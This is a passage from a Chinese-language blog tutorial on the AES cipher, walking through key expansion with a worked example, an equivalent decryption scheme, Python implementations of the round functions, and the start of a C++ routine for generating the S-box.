src="https://img-blog.csdn.net/20170220082316736?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="keyextends"><br> 这个4</em>4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0  = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。<br> 接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：<br> 1.如果i不是4的倍数，那么第i列由如下等式确定：<br> W[i]=W[i-4]⨁W[i-1]<br> 2.如果i是4的倍数，那么第i列由如下等式确定：<br> W[i]=W[i-4]⨁T(W[i-1])<br> 其中，T是一个有点复杂的函数。<br> 函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。<br> a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。<br> b.字节代换：对字循环的结果使用S盒进行字节代换。<br> c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。<br> 轮常量Rcon[j]是一个字，其值见下表。</p><table><thead><tr><th>j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>Rcon[j]</td><td>01 00 00 00</td><td>02 00 00 00</td><td>04 00 00 00</td><td>08 00 00 00</td><td>10 00 00 00</td></tr><tr><td>j</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td></tr><tr><td>Rcon[j]</td><td>20 00 00 00</td><td>40 00 00 00</td><td>80 00 00 00</td><td>1B 00 00 00</td><td>36 00 00 00</td></tr></tbody></table><p>下面举个例子：<br> 设初始的128位密钥为：<br> 3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br> 那么4个初始值为：<br> W[0] = 3C A1 0B 21<br> W[1] = 57 F0 19 16<br> W[2] = 90 2E 13 80<br> W[3] = AC C1 07 BD<br> 下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。<br> 由于4是4的倍数，所以：<br> W[4] = W[0] ⨁ T(W[3])<br> T(W[3])的计算步骤如下：<br> \1. 循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC;<br> \2. 将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;<br> \3. 将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])=79 C5 7A 91，故<br> W[4] = 3C A1 0B 21 ⨁ 79 C5 7A 91 = 45 64 71 B0<br> 其余的3个子密钥段的计算如下：<br> W[5] = W[1] ⨁ W[4] = 57 F0 19 16 ⨁ 45 64 71 B0 = 12 94 68 A6<br> W[6] = W[2] ⨁ W[5] =90 2E 13 80 ⨁ 12 94 68 A6 = 82 BA 7B 26<br> W[7] = W[3] ⨁ W[6] = AC C1 07 BD ⨁ 82 BA 7B 26 = 2E 7B 7C 9B<br> 所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。</p><h3 id="六、AES解密"><a href="#六、AES解密" class="headerlink" title="六、AES解密"></a>六、AES解密</h3><p>在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。<br><img src="https://img-blog.csdn.net/20170220094853620?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="deaes"></p><h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h4 id="XTime运算"><a href="#XTime运算" class="headerlink" title="XTime运算"></a>XTime运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xtime = <span class="keyword">lambda</span> a: (((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="字节替代"><a href="#字节替代" class="headerlink" title="字节替代"></a>字节替代</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__sub_bytes</span><span class="params">(self, s)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">s[i][j] = Sbox[s[i][j]]</span><br></pre></td></tr></table></figure><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒,状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出</p><h4 id="逆字节替换"><a href="#逆字节替换" class="headerlink" title="逆字节替换"></a>逆字节替换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_sub_bytes</span><span class="params">(self, s)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">s[i][j] = InvSbox[s[i][j]]</span><br></pre></td></tr></table></figure><h4 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h4><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102010146.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__shift_rows</span><span class="params">(self, s)</span>:</span></span><br><span class="line">s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h4 id="逆行移位变换"><a href="#逆行移位变换" class="headerlink" title="逆行移位变换"></a>逆行移位变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_shift_rows</span><span class="params">(self, s)</span>:</span></span><br><span class="line">s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line">s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h4 id="单列列混淆变换"><a href="#单列列混淆变换" class="headerlink" title="单列列混淆变换"></a>单列列混淆变换</h4><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102014940.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__mix_single_column</span><span class="params">(self, a)</span>:</span></span><br><span class="line">t = a[<span class="number">0</span>] ^ a[<span class="number">1</span>] ^ a[<span class="number">2</span>] ^ a[<span class="number">3</span>]</span><br><span class="line">u = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] ^= t ^ xtime(a[<span class="number">0</span>] ^ a[<span class="number">1</span>])</span><br><span class="line">a[<span class="number">1</span>] ^= t ^ xtime(a[<span class="number">1</span>] ^ a[<span class="number">2</span>])</span><br><span class="line">a[<span class="number">2</span>] ^= t ^ xtime(a[<span class="number">2</span>] ^ a[<span class="number">3</span>])</span><br><span class="line">a[<span class="number">3</span>] ^= t ^ xtime(a[<span class="number">3</span>] ^ u)</span><br></pre></td></tr></table></figure><h4 id="列混淆变换"><a href="#列混淆变换" class="headerlink" title="列混淆变换"></a>列混淆变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__mix_columns</span><span class="params">(self, s)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">self.__mix_single_column(s[i])</span><br></pre></td></tr></table></figure><h4 id="逆混淆列变换"><a href="#逆混淆列变换" class="headerlink" title="逆混淆列变换"></a>逆混淆列变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_mix_columns</span><span class="params">(self, s)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">u = xtime(xtime(s[i][<span class="number">0</span>] ^ s[i][<span class="number">2</span>]))</span><br><span class="line">v = xtime(xtime(s[i][<span class="number">1</span>] ^ s[i][<span class="number">3</span>]))</span><br><span class="line">s[i][<span class="number">0</span>] ^= u</span><br><span class="line">s[i][<span class="number">1</span>] ^= v</span><br><span class="line">s[i][<span class="number">2</span>] ^= u</span><br><span class="line">s[i][<span class="number">3</span>] ^= v</span><br><span class="line">self.__mix_columns(s)</span><br></pre></td></tr></table></figure><h4 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h4><h5 id="轮密钥加变换"><a href="#轮密钥加变换" class="headerlink" title="轮密钥加变换"></a>轮密钥加变换</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__add_round_key</span><span class="params">(self, s, k)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">s[i][j] ^= k[i][j]</span><br></pre></td></tr></table></figure><h5 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a><strong>密钥扩展</strong></h5><p>将输入的密钥扩展为11组128位密钥组，其中第0组为输入密钥本身 </p><p> 其后第n组第i列 为 第n-1组第i列 与 第n组第i-1列之和（模2加法，1&lt;= i &lt;=3）</p><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102042294.png" alt="img"></p><p>对于每一组 第一列即i=0，有特殊的处理</p><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102044067.png" alt="img"></p><blockquote><p>将前一列即第n-1组第3列的4个字节循环左移1个字节，</p><p>并对每个字节进行字节替代变换SubBytes</p><p>将第一行（即第一个字节）与轮常量rc[n]相加 </p><p>最后再与前一组该列相加 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, master_key)</span>:</span></span><br><span class="line">self.change_key(master_key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span><span class="params">(self, master_key)</span>:</span></span><br><span class="line">self.round_keys = text2matrix(master_key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">4</span> * <span class="number">11</span>):</span><br><span class="line">self.round_keys.append([])</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">byte = self.round_keys[i - <span class="number">4</span>][<span class="number">0</span>]        \</span><br><span class="line">^ Sbox[self.round_keys[i - <span class="number">1</span>][<span class="number">1</span>]]  \</span><br><span class="line">^ Rcon[int(i/<span class="number">4</span>)]</span><br><span class="line">self.round_keys[i].append(byte)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">byte = self.round_keys[i - <span class="number">4</span>][j]    \</span><br><span class="line"> ^ Sbox[self.round_keys[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">4</span>]]</span><br><span class="line">self.round_keys[i].append(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                    byte = self.round_keys[i - <span class="number">4</span>][j]    \</span><br><span class="line">                         ^ self.round_keys[i - <span class="number">1</span>][j]</span><br><span class="line">                    self.round_keys[i].append(byte)</span><br></pre></td></tr></table></figure><h4 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">self.plain_state = text2matrix(plaintext)</span><br><span class="line">self.__add_round_key(self.plain_state, self.round_keys[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">self.__round_encrypt(self.plain_state, self.round_keys[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)])</span><br><span class="line">self.__sub_bytes(self.plain_state)</span><br><span class="line">self.__shift_rows(self.plain_state)</span><br><span class="line">self.__add_round_key(self.plain_state, self.round_keys[<span class="number">40</span>:])</span><br><span class="line"><span class="keyword">return</span> matrix2text(self.plain_state)</span><br></pre></td></tr></table></figure><h4 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, ciphertext)</span>:</span></span><br><span class="line">self.cipher_state = text2matrix(ciphertext)</span><br><span class="line">self.__add_round_key(self.cipher_state, self.round_keys[<span class="number">40</span>:])</span><br><span class="line">self.__inv_shift_rows(self.cipher_state)</span><br><span class="line">self.__inv_sub_bytes(self.cipher_state)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">self.__round_decrypt(self.cipher_state, self.round_keys[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)])</span><br><span class="line">        self.__add_round_key(self.cipher_state, self.round_keys[:<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">return</span> matrix2text(self.cipher_state)</span><br></pre></td></tr></table></figure><h4 id="AES的S盒"><a href="#AES的S盒" class="headerlink" title="AES的S盒"></a>AES的S盒</h4><p>参考了GitHub和看雪论坛的代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MatrixGF2.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"PolynomialGF2.h"</span></span></span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxPositiveBox(<span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxReverseBox(<span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxBytePositiveTransformMatrix(<span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxByteReverseTransformMatrix(<span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">BYTE g_bytPositiveFixed = <span class="number">0</span>;</span><br><span class="line">BYTE g_bytReverseFixed = <span class="number">0</span>;</span><br><span class="line">PolynomialGF2 g_polyModle; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKEBYTE(_high, _low) (((_high) &lt;&lt; 4) | (_low)) </span></span><br><span class="line"><span class="function">PolynomialGF2 <span class="title">PolynomialEuclidEx</span><span class="params">(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyA,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">const</span> PolynomialGF2 &amp;kref_polyB,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PolynomialGF2 &amp;ref_polyX,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PolynomialGF2 &amp;ref_polyY)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (kref_polyB.EqualZero())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"zero!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> iHighestBitIndex = kref_polyA.GetHightestBitIndex();</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyQuotient</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyRemainder</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastLastX</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    polyLastLastX = <span class="number">1</span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastLastY</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    PolynomialGF2 polyLastLastRemainder = kref_polyA;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastX</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastY</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    polyLastY = <span class="number">1</span>;</span><br><span class="line">    PolynomialGF2 polyLastRemainder = kref_polyB;</span><br><span class="line">    ref_polyX.Clear();</span><br><span class="line">    ref_polyY.Clear();</span><br><span class="line">    ref_polyX.Insert(<span class="number">0</span>, iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    ref_polyY.Insert(<span class="number">0</span>, iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    ref_polyY = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        polyLastLastRemainder.Division(polyLastRemainder,</span><br><span class="line">                                       polyQuotient,</span><br><span class="line">                                       polyRemainder);</span><br><span class="line">        <span class="keyword">if</span> (polyRemainder.EqualZero())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ref_polyX = polyLastLastX - polyLastX * polyQuotient;</span><br><span class="line">        ref_polyY = polyLastLastY - polyLastY * polyQuotient;</span><br><span class="line">        polyLastLastRemainder = polyLastRemainder;</span><br><span class="line">        polyLastRemainder = polyRemainder;</span><br><span class="line">        polyLastLastX = polyLastX;</span><br><span class="line">        polyLastLastY = polyLastY;</span><br><span class="line">        polyLastX = ref_polyX;</span><br><span class="line">        polyLastY = ref_polyY;</span><br><span class="line">    &#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">    <span class="keyword">return</span> polyLastRemainder;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitByteTransformMatrix</span><span class="params">(PolynomialGF2 &amp;ref_polyInit,</span></span></span><br><span class="line"><span class="function"><span class="params">                             MatrixGF2&lt;BYTE&gt; &amp;ref_mtxTarget)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> uiColumnNumber = ref_mtxTarget.GetColumnNumber();</span><br><span class="line">    <span class="keyword">if</span> (ref_polyInit.GetSize() != ref_mtxTarget.GetColumnNumber())</span><br><span class="line">    &#123;</span><br><span class="line">        ref_polyInit.PaddingZero(uiColumnNumber);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> uiRowNumber = uiColumnNumber;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; uiRowNumber; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> iOffset = cntY;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; uiColumnNumber; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> iActualPos = cntX + iOffset;</span><br><span class="line">            <span class="keyword">if</span> (iActualPos &gt;= uiColumnNumber)</span><br><span class="line">            &#123;</span><br><span class="line">                iActualPos -= uiColumnNumber;</span><br><span class="line">            &#125;</span><br><span class="line">            ref_mtxTarget[cntY][iActualPos] = ref_polyInit[cntX];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitPositiveBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytPositiveFixed).GetDequeFormat();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; <span class="number">16</span>; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span 